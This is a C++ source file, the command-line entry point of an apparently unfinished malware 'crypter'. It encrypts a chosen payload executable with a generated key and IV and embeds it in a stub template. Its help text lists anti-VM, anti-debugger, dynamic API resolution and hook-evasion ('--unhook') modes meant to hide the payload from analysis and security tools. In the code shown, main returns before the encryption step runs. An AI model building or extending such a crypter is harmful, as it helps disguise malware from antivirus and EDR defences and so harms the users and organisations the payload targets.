// main.cpp
#include "utils.h"
#include "flags.h"
#include "constant.h"
#include "config.h"
#include <iostream>
#include <cstring>
#include <fstream>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

bool flags[FLAG_COUNT] = {false};

void displayHelp(const int COLOR){
    setColor(COLOR);
    cout << "\nUsage: ./main.exe [options]\nOptions:\n";
    cout << "\t-h, --help                 show all options, and exit\n";
    cout << "\t-p                         display paths for payload, stub output directory, stub template, and exit\n";
    cout << "\t-n <\"name\">              name for stub\n";
    cout << "\t-c, --compile              compile generated stub immediately. makefile must be configured properly\n";
    cout << "\t--payload <C:\\\\path>       specify payload. first exe in ./bin will be used otherwise\n";
    cout << "\t--stub <C:\\\\stub>          specify stub template. by default /resource/stub_template.cpp is used\n";
    cout << "\t--rand                     enable random memory allocations\n";
    cout << "\t--vm                       enable anti-VM mode\n";
    cout << "\t--db                       enable anti-debugger mode\n";
    cout << "\t--dyn                      enable dynamic API call resolution\n";
    cout << "\t--unhook                   evades hooks\n";
    cout << "\t--pdb                      enable print debugging mode on stub\n";
    cout << "\tFlags cannot be combined\n";
    resetColor();
}

Config parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template, string *stub_name){
    Config config;

    

    string tmpPl = *path_to_payload;

    resetColor();
    for(int i = 1; i < argc; i++){
        string arg = argv[i];

        if(arg == "--help" || arg == "-h"){
            config.help = true;
            return config;

        } else if (arg == "-p"){
            config.paths = true;
            return config;
        }
        
        if(arg == "--payload"){
            if(i + 1 >= argc){
                throw invalid_argument("Missing path after --payload");
            }

            filesystem::path path = argv[++i];

            if(!filesystem::exists(path)){
                throw invalid_argument("Payload path does not exist: " + path.string());
            }

            if(!filesystem::is_regular_file(path)){
                throw invalid_argument("Payload path is not regular file: " + path.string());
            }

            // Not sure if it is necessary to set a flag but keeping it for now
            config.payload = true;
            config.payload_path = path.string();
            continue;

        } else if(arg == "--stub"){
            if(i + 1 >= argc){
                throw invalid_argument("Missing path after --stub");
            }

            filesystem::path path = argv[++i];

            if(!filesystem::exists(path)){
                throw invalid_argument("Stub template path does not exist: " + path.string());
            }

            if(!filesystem::is_regular_file(path)){
                throw invalid_argument("Stub template path is not regular file: " + path.string());
            }

            config.stub = true;
            config.stub_path = path.string();
            continue;
            
        } else if (arg == "--rand"){
            config.rand = true;
            continue;

        } else if(arg == "--vm"){
            config.vm = true;
            continue;

        } else if(arg == "--db"){
            config.db = true;
            continue;

        } else if(arg == "--dyn"){
            config.dyn = true;
            continue;

        } else if(arg == "-c" || arg == "--compile"){
            config.compile = true;
            continue;

        } else if(arg == "--pdb"){
            config.pdb = true;
            continue;

        } else if(arg == "-n"){
            config.name = true;
            config.stub_name = argv[i+1];
            continue;

        } else {
            throw invalid_argument("Unrecognized flag: " + arg);
        }
    }

    return config;

    // /bin has already been checked, if no payload is specified using --payload, search /bin for the first .exe
    /*
    if (tmpPl == *path_to_payload) {
        setColor(COLOR_INFO);
        cout << "searching ./bin...\n";
        if (fs::exists("./bin") && fs::is_directory("./bin")) {
            for (const auto& entry : fs::directory_iterator("./bin")) {
                if (fs::is_regular_file(entry) && ((entry.status().permissions() & fs::perms::owner_exec) != fs::perms::none ||
                                                   (entry.status().permissions() & fs::perms::group_exec) != fs::perms::none ||
                                                   (entry.status().permissions() & fs::perms::others_exec) != fs::perms::none)) {
                    *path_to_payload = entry.path().string();
                    setColor(COLOR_SUCCESS);
                    cout << "Found " << *path_to_payload << "\n";
                    resetColor();
                    return;
                }
            }
            setColor(COLOR_ERROR);
            cerr << "No exe found in ./bin. Move payload to ./bin or specify full path with --payload\n";
            resetColor();
            exit(1);
        }
    }*/
}

void displayOptions(Config c){
    if(c.help){
        displayHelp(COLOR_INFO);
        return;
    }
    if(c.paths){
        cout << "Paths:\n\tPath to payload: " << c.payload_path << \
                "\n\tPath to output directory: " << c.output_dir << \
                "\n\tPath to stub template: " << c.stub_path << endl;
        return;
    }
    if(c.compile){
        cout << "Compilation enabled" << endl;
    }
    if(c.payload){
        cout << "Payload set to: " << c.payload_path << endl;
    }
    if(c.stub){
        cout << "Stub template path set to: " << c.stub_path << endl;
    }
    if(c.rand){
        cout << "Stub randomization mode enabled" << endl;
    }
    if(c.vm){
        cout << "Anti-VM mode enabled" << endl;
    }
    if(c.db){
        cout << "Anti-Debugger mode enabled" << endl;
    }
    if(c.dyn){
        cout << "Dynamic API call resolution enabled" << endl;
    }    
}

int main(int argc, char * argv[]){

    fs::path executable_path = fs::absolute(argv[0]);
    fs::path base_path = executable_path.parent_path().parent_path()/"cppcrypter";  // Assuming the executable is two levels deep from the base path

    // Path to payload is initially just the directory where any payload should be placed
    // If no payload is specified with --payload, /bin will be iterated through for an exe
    // which is why /bin needs to exist first before moving forward
    // stub template has an option but its not completely ne
    string path_to_payload = (base_path / "bin").string();
    string path_to_output_dir = (base_path / "stub").string() + "\\";
    string path_to_stub_template = (base_path / "resource\\stub_template.cpp").string();
    string stub_name;

    /*
    // Make sure the defaults exist before parsing arguments
    setColor(COLOR_ERROR);
    if(!filesystem::exists(path_to_payload)){
        cerr << "./bin directory not found\n";
        resetColor();
        exit(1);
    }
    if(!filesystem::exists(path_to_output_dir)){
        cerr << "./out directory not found\n";
        resetColor();
        exit(1);
    }
    if(!filesystem::exists(path_to_stub_template)){
        cout << "./resource/stub.cpp not found\n";
        resetColor();
        exit(1);
    }
    resetColor();

    */

    Config c;

    try {
        c = parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template, &stub_name);
    } catch (const invalid_argument& e){
        setColor(COLOR_ERROR);
        cerr << "Argument error: " << e.what() << endl;
        displayHelp(COLOR_ERROR);

        resetColor();
        return 1;
    }

    


    displayOptions(c);
    return 0;

    // reading bytes of payload
    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        setColor(COLOR_ERROR);
        cerr << "Error reading binary\n";
        resetColor();
        exit(1);
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(LEN, LEN);
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    //Xor(buf, 0x1A);

    writeStub(flags, stub_name, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);

    return 0;
}
